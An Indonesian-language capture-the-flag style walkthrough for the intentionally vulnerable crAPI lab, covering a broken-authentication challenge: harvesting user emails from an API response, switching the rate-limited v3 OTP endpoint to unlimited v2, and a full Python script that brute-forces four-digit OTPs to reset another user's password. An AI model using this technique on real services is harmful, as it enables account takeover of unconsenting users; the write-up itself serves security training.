# Broken User Authentication
Kesalahanpahaman pengembang aplikasi mengenai batasan otentitikasi menyebabkan penyerang dapat memperoleh kendali penuh atas akun pengguna lain di sistem, seperti membaca data pribadi mereka dan  melakukan tindakan sensitif atas nama mereka. Sistem tidak mungkin bisa membedakan mana tindakan dari penyerang dan mana yang dari pengguna yang sah.

## Challenge 3 - Reset the password of a different user
- Hidupkan tool Burp Suite dan pergi ke halaman **Community**

![alt text](https://github.com/rahardian-dwi-saputra/crAPI-walkthrough/blob/main/assets/broken%20user%20authentication/bua%201.JPG)

- Pada tool Burp Suite terdeteksi bahwa halaman tersebut melakukan request ke endpoint API `/community/api/v2/community/posts/recent` yang response nya memuat email dari pengguna lain yang dapat kita manfaatkan untuk melakukan request **reset password**

![alt text](https://github.com/rahardian-dwi-saputra/crAPI-walkthrough/blob/main/assets/broken%20user%20authentication/bua%202.JPG)

- Sekarang kita logout dari akun yang kita gunakan kemudian kita coba fitur **Forgot Password**

![alt text](https://github.com/rahardian-dwi-saputra/crAPI-walkthrough/blob/main/assets/broken%20user%20authentication/bua%203.JPG)

- Lalu isi dengan email yang kita gunakan untuk mengakses web crAPI dan tekan tombol **Send OTP**

![alt text](https://github.com/rahardian-dwi-saputra/crAPI-walkthrough/blob/main/assets/broken%20user%20authentication/bua%204.JPG)

![alt text](https://github.com/rahardian-dwi-saputra/crAPI-walkthrough/blob/main/assets/broken%20user%20authentication/bua%205.JPG)

- Pada tool Burp Suite terdeteksi endpoint API `/identity/api/auth/forget-password` untuk mengirim kode OTP ke email

![alt text](https://github.com/rahardian-dwi-saputra/crAPI-walkthrough/blob/main/assets/broken%20user%20authentication/bua%206.JPG)

- Buka mailhog di tab baru dengan URL `http://IP_Server:8025`, disini kita menerima email yang berisi kode OTP

![alt text](https://github.com/rahardian-dwi-saputra/crAPI-walkthrough/blob/main/assets/broken%20user%20authentication/bua%207.JPG)

- Kode OTP tersebut berupa angka yang terdiri dari 4 digit

![alt text](https://github.com/rahardian-dwi-saputra/crAPI-walkthrough/blob/main/assets/broken%20user%20authentication/bua%208.JPG)

- Sekarang kita coba masukkan kode OTP yang salah ke halaman forgot password dan masukkan password baru lalu tekan tombol **Set Password** maka kita akan mendapat pesan `Invalid OTP`

![alt text](https://github.com/rahardian-dwi-saputra/crAPI-walkthrough/blob/main/assets/broken%20user%20authentication/bua%209.JPG)

![alt text](https://github.com/rahardian-dwi-saputra/crAPI-walkthrough/blob/main/assets/broken%20user%20authentication/bua%2010.JPG)

- Pada tool Burp Suite terdeteksi endpoint API `/identity/api/auth/v3/check-otp` yang digunakan untuk mengecek kode OTP dan mereset password

![alt text](https://github.com/rahardian-dwi-saputra/crAPI-walkthrough/blob/main/assets/broken%20user%20authentication/bua%2011.JPG)

- Klik kanan request tersebut dan pilih **Send to Repeater**

![alt text](https://github.com/rahardian-dwi-saputra/crAPI-walkthrough/blob/main/assets/broken%20user%20authentication/bua%2012.JPG)

- Pindah ke tab Repeater dan tekan tombol **Send**

![alt text](https://github.com/rahardian-dwi-saputra/crAPI-walkthrough/blob/main/assets/broken%20user%20authentication/bua%2013.JPG)

- Disini kita bisa mencoba memasukkan kode OTP yang salah berulang kali untuk memastikan apakah ada pembatasan request atau tidak. Setelah beberapa kali kita mendapat pesan bahwa request kita mencapai batas maksimal

![alt text](https://github.com/rahardian-dwi-saputra/crAPI-walkthrough/blob/main/assets/broken%20user%20authentication/bua%2014.JPG)

- Setelah kita coba mengubah endpoint dari `v3` menjadi `v2` kita mendapati bahwa endpoint ini tidak memiliki batas request yang ditentukan sehingga memungkinkan kita untuk melakukan brute force kode OTP dan mengubah password user lain yang kita temukan di halaman **Community**

![alt text](https://github.com/rahardian-dwi-saputra/crAPI-walkthrough/blob/main/assets/broken%20user%20authentication/bua%2015.JPG)

- Disini kita akan membuat program menggunakan bahasa python untuk melakukan brute force kode OTP dan melakukan reset password pada akun user lain. Pertama-tama kita akan mengirim request ke endpoint `/identity/api/auth/forget-password` untuk mengirim kode OTP ke email. Setelah itu mereset password dengan melakukan uji coba kode OTP dari `0000` hingga `9999` sesuai format kode OTP yang terima di email melalui endpoint `/identity/api/auth/v2/check-otp`. Berikut ini adalah kode program yang kita gunakan, simpan script dibawah ini dengan nama `brute_otp_crapi.py`
```sh
import requests
import time

start = time.time()

url = 'http://IP_Server:8888' #ubah url sesuai url server anda
email = 'email' #ubah dengan email yang anda temukan

headers = {
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0',
    'Accept': '*/*',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip, deflate',
    'Referer': url+'/forgot-password',
    'Origin': url,
    'Connection': 'close',
    'Content-Type': 'application/json',
    'Cache-Control': 'no-cache',
    'Pragma': 'no-cache',
}

# Mengirim kode OTP ke email
response = requests.post(url+'/identity/api/auth/forget-password', headers=headers, json={"email": email})

if response.status_code == 200:
	json_response = response.json()
	print(json_response["message"])
	response.close()
	print("\nMelakukan bypass kode OTP dengan brute force\n")
	
	#bypass kode OTP dengan brute force
	for i in range(10000):
		#padding angka 0
		if i < 1000:
			otp = f"{i:04}"
		else:
			otp = i
		
		data_reset_password = {
	           'email': email,
	           'otp': otp,
	           'password': 'password', #ubah password sesuai keinginan anda
		}
		
		r = requests.post(url+'/identity/api/auth/v2/check-otp', headers=headers, json=data_reset_password)
		print('[Kode OTP:{}, Response:{}]'.format(otp,r.status_code))
		
		if r.status_code == 200:
			print("Berhasil melakukan reset password")
			print(r.json())
			r.close()
			break
		elif r.status_code == 503:
			print("Request telah dibatasi")
			print(r.json())
			r.close()
			break
		
		r.close()
		
	
else:
	print("Permintaan tidak dapat dikirim")
	
end = time.time()
print(f"\nWaktu eksekusi:{(end-start)*10**3:.03f} ms")

```

- Jalankan program diatas dan tunggu hingga proses selesai
```sh
python3 brute_otp_crapi.py
``` 

![alt text](https://github.com/rahardian-dwi-saputra/crAPI-walkthrough/blob/main/assets/broken%20user%20authentication/bua%2016.JPG)

![alt text](https://github.com/rahardian-dwi-saputra/crAPI-walkthrough/blob/main/assets/broken%20user%20authentication/bua%2017.JPG)